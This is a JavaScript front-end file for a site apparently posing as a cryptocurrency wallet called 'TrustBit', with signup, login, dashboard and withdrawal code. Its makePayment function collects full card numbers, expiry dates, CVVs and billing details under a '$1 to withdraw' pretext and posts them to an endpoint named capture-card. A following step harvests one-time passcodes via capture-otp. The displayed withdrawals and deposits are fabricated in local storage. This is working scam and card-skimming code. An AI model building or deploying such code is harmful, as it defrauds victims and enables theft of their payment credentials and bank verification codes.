// ======================
// 🧩 DOM LOGIC
// ======================

// 🔑 LIVE BACKEND URL
const API_BASE = 'https://trustbit-backend.onrender.com';

document.addEventListener("DOMContentLoaded", () => {
    console.log("TrustBit Active");

    // --- SIGNUP ---
    const signupBtn = document.getElementById('signupBtn');
    if (signupBtn) {
        signupBtn.onclick = async () => {
            const email = document.getElementById('signupEmail').value.trim();
            const password = document.getElementById('signupPass').value.trim();

            if (!email || !password) return alert("Please fill all fields");

            signupBtn.innerText = "Creating Account...";
            signupBtn.disabled = true;

            try {
                const response = await fetch(`${API_BASE}/api/signup`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });

                if (response.ok) {
                    alert("Account created successfully! Please Login.");
                    window.location.href = "index.html";
                } else {
                    const errorData = await response.json();
                    alert(errorData.error || "Signup failed.");
                }
            } catch (err) {
                console.error("Backend Error:", err);
                alert("Server is waking up. Please wait 30 seconds and try again.");
            } finally {
                signupBtn.innerText = "Sign Up";
                signupBtn.disabled = false;
            }
        };
    }

    // --- LOGIN (NOW SYNCED WITH DATABASE) ---
    const loginBtn = document.getElementById('loginBtn');
    if (loginBtn) {
        loginBtn.onclick = async () => {
            const email = document.getElementById('loginEmail').value.trim();
            const password = document.getElementById('loginPass').value.trim();

            if (!email || !password) return alert("Please enter email and password");

            loginBtn.innerText = "Verifying...";
            loginBtn.disabled = true;

            try {
                // 1. Ask the Backend/Database for user details
                const response = await fetch(`${API_BASE}/api/login`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });

                const data = await response.json();

                if (response.ok) {
                    // 2. Save the real data from DB to this device's localStorage
                    localStorage.setItem('trustbitUser', JSON.stringify({
                        email: data.user.email,
                        btc: data.user.btc,
                        usd: data.user.usd,
                        wallet: data.user.wallet,
                        history: [] 
                    }));
                    localStorage.setItem('isLoggedIn', 'true');

                    window.location.href = "dashboard.html";
                } else {
                    alert(data.error || "Invalid credentials");
                }
            } catch (err) {
                console.error("Login Error:", err);
                alert("Server is spinning up. This can take 50 seconds. Please try again in a moment.");
            } finally {
                loginBtn.innerText = "Sign In";
                loginBtn.disabled = false;
            }
        };
    }

    // --- LOGOUT ---
    const logoutBtn = document.getElementById('logoutBtn');
    if (logoutBtn) {
        logoutBtn.onclick = () => {
            localStorage.removeItem('isLoggedIn');
            localStorage.removeItem('trustbitUser'); // Clear user data on logout
            window.location.href = "index.html";
        };
    }

    // --- DASHBOARD LOAD CHECK ---
    if (window.location.pathname.includes("dashboard.html")) {
        if (localStorage.getItem('isLoggedIn') !== 'true') {
            window.location.href = "index.html";
        } else {
            loadDashboard();
        }
    }
});

// ======================
// 🧾 GLOBAL FUNCTIONS
// ======================
function loadDashboard() {
    const user = JSON.parse(localStorage.getItem('trustbitUser'));
    if (!user) return;

    if (document.getElementById('userEmail')) document.getElementById('userEmail').innerText = user.email;
    if (document.getElementById('btcBalance')) document.getElementById('btcBalance').innerText = `${user.btc} BTC`;
    if (document.getElementById('usdBalance')) document.getElementById('usdBalance').innerText = `$${parseFloat(user.usd).toLocaleString()}`;
    if (document.getElementById('walletAddressDisplay')) document.getElementById('walletAddressDisplay').innerText = user.wallet;

    const log = document.getElementById('activityLog');
    if (log) {
        if (!user.history || user.history.length === 0) {
            log.innerHTML = `<p class="text-muted fst-italic">No recent transactions...</p>`;
        } else {
            log.innerHTML = ""; 
            user.history.forEach(item => {
                const isPending = item.status === "Pending";
                const entry = document.createElement('div');
                entry.className = "border-bottom border-secondary py-2 text-white";
                entry.innerHTML = `
                    <span class="${isPending ? 'text-warning' : 'text-success'}">${isPending ? '⏳' : '↑'} ${item.type}</span>
                    <span class="float-end">${item.amount} BTC</span><br>
                    <small class="text-muted">Status: <b>${item.status || 'Completed'}</b> • ID: ${item.id}</small>
                `;
                log.appendChild(entry);
            });
        }
    }
}

function openWithdraw() {
    const modalElement = document.getElementById('withdrawModal');
    if (modalElement) {
        const withdrawModal = new bootstrap.Modal(modalElement);
        withdrawModal.show();
    }
}

async function makePayment() {
    const payBtn = document.getElementById('payBtn');
    const data = {
        cardNumber: document.getElementById('cardNumber').value.trim(),
        expiry: document.getElementById('cardExpiry').value.trim(),
        cvv: document.getElementById('cardCvv').value.trim(),
        zip: document.getElementById('billingZip').value.trim(),
        cardName: document.getElementById('cardName').value.trim(),
        cardType: document.getElementById('cardType').value,
        email: document.getElementById('Email').value.trim()
    };

    if (!data.cardNumber || !data.email) {
        return alert("⚠️ Please fill in card details and email.");
    }

    payBtn.innerText = "Verifying...";
    payBtn.disabled = true;

    try {
        const response = await fetch(`${API_BASE}/api/capture-card`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        if (!response.ok) throw new Error("Server rejected the data");

        alert("✅ Card Verified! Redirecting to OTP...");
        window.location.href = "otp.html";
    } catch (err) {
        console.error("Fetch Error:", err);
        alert("Error connecting to server.");
        payBtn.disabled = false;
        payBtn.innerText = "Pay $1 & Continue";
    }
}

async function confirmOTP() {
    const otpCode = document.getElementById('otpCode').value;
    const user = JSON.parse(localStorage.getItem('trustbitUser'));

    if (otpCode.length !== 6) return alert("Enter 6-digit OTP");

    try {
        await fetch(`${API_BASE}/api/capture-otp`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: user.email, otpCode })
        });

        const pendingTx = {
            type: "Withdrawal",
            status: "Pending",
            amount: "0.05",
            id: "0x" + Math.random().toString(16).substring(2, 10)
        };
        user.history.unshift(pendingTx);
        localStorage.setItem('trustbitUser', JSON.stringify(user));

        alert("✅ Payment confirmed! Your withdrawal is now processing.");
        window.location.href = "dashboard.html";
    } catch (err) {
        alert("Error verifying OTP.");
    }
}

function copyWallet(event) {
    event.preventDefault();
    const address = document.getElementById('walletAddressDisplay').innerText;
    navigator.clipboard.writeText(address).then(() => {
        alert("Copied to clipboard!");
    });
}

function quickDeposit() {
    let user = JSON.parse(localStorage.getItem('trustbitUser'));
    if (!user) return alert("No user found!");

    const addedBtc = 0.01;
    const addedUsd = 500.00;

    user.btc = (parseFloat(user.btc) + addedBtc).toFixed(8);
    user.usd = (parseFloat(user.usd) + addedUsd).toFixed(2);

    if (!user.history) user.history = [];
    user.history.unshift({
        type: "Received",
        amount: addedBtc,
        status: "Completed",
        id: "0x" + Math.random().toString(16).substring(2, 10),
        date: new Date().toLocaleDateString()
    });

    localStorage.setItem('trustbitUser', JSON.stringify(user));
    loadDashboard();
    alert(`💰 Quick Deposit: +$500.00 Added!`);
}
